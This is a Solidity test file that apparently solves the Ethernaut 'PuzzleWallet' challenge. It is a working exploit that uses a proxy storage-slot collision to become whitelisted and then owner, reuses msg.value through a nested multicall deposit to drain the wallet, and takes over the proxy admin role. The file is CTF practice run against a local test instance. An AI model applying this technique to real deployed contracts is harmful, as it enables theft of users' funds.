// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

import { PRBTest } from "@prb/test/PRBTest.sol";
import { console } from "forge-std/console.sol";

import { Ethernaut } from "src/Ethernaut.sol";

import { PuzzleWallet, PuzzleProxy } from "src/PuzzleWallet/PuzzleWallet.sol";
import { PuzzleWalletFactory } from "src/PuzzleWallet/PuzzleWalletFactory.sol";

contract PuzzleWalletAttackTest is PRBTest {
    Ethernaut public ethernaut;
    PuzzleWalletFactory public factory;
    address public puzzleWalletInstance;
    // PuzzleWalletAttack public attacker;
    address public playerAddress = address(0x696969);

    bytes[] public depositData;
    bytes[] public multicallData;

    function setUp() public {
        vm.startPrank(playerAddress);
        vm.deal(playerAddress, 69 ether);
        ethernaut = new Ethernaut();
        factory = new PuzzleWalletFactory();

        ethernaut.registerLevel(factory);
        puzzleWalletInstance = ethernaut.createLevelInstance{ value: 0.001 ether }(factory);
        vm.stopPrank();
    }

    function testPuzzleWalletAttack() public {
        PuzzleWallet wallet = PuzzleWallet(payable(puzzleWalletInstance));
        PuzzleProxy proxy = PuzzleProxy(payable(puzzleWalletInstance));
        vm.startPrank(playerAddress, playerAddress);

        // slot 0 collision:
        // Proxy:   address public pendingAdmin;
        // Wallet:  address public owner;
        proxy.proposeNewAdmin(playerAddress);
        wallet.addToWhitelist(playerAddress);
        // assert that we whitelisted our playerAddress
        assert(wallet.whitelisted(playerAddress));

        // prepare depositData for inclusion into multicallData
        depositData = [abi.encodeWithSelector(wallet.deposit.selector, "")];
        // call deposit first, then call multicall with a second deposit as an argument
        multicallData = [
            abi.encodeWithSelector(wallet.deposit.selector, ""),
            abi.encodeWithSelector(wallet.multicall.selector, depositData)
        ];

        // Balances before executions
        console.log("WALLET BALANCE BEFORE DEPOSIT:", address(wallet).balance);
        console.log("RECORDED WALLET BALANCE BEFORE DEPOSIT:", wallet.balances(playerAddress));

        // execute multicall with prepared multicall data above
        wallet.multicall{ value: 1 ether }(multicallData);

        // Balances after multicall with double-deposit
        console.log("RECORDED WALLET BALANCE AFTER DEPOSIT:", wallet.balances(playerAddress));
        console.log("WALLET BALANCE AFTER DEPOSIT:", address(wallet).balance);

        // execute withdrawal of the entire wallet balance
        wallet.execute(playerAddress, address(wallet).balance, bytes(""));

        // Balances after withdrawal of wallet balance
        console.log("RECORDED WALLET BALANCE AFTER WITHDRAWAL:", wallet.balances(playerAddress));
        console.log("WALLET BALANCE AFTER WITHDRAWAL:", address(wallet).balance);

        // affirm wallet has been cleared
        assert(address(wallet).balance == 0);
        
        // set new proxy admin via the maxBalance storage overlap
        // slot 1 collision:
        // Proxy:   address public admin;
        // Wallet:  uint256 public maxBalance;
        wallet.setMaxBalance(uint256(uint160(playerAddress)));

        // assert new owner
        assert(proxy.admin() == playerAddress);

        // test to make sure we completed the level; submit level as player
        bool levelComplete = ethernaut.submitLevelInstance(payable(puzzleWalletInstance));
        assert(levelComplete);

        vm.stopPrank();
    }
}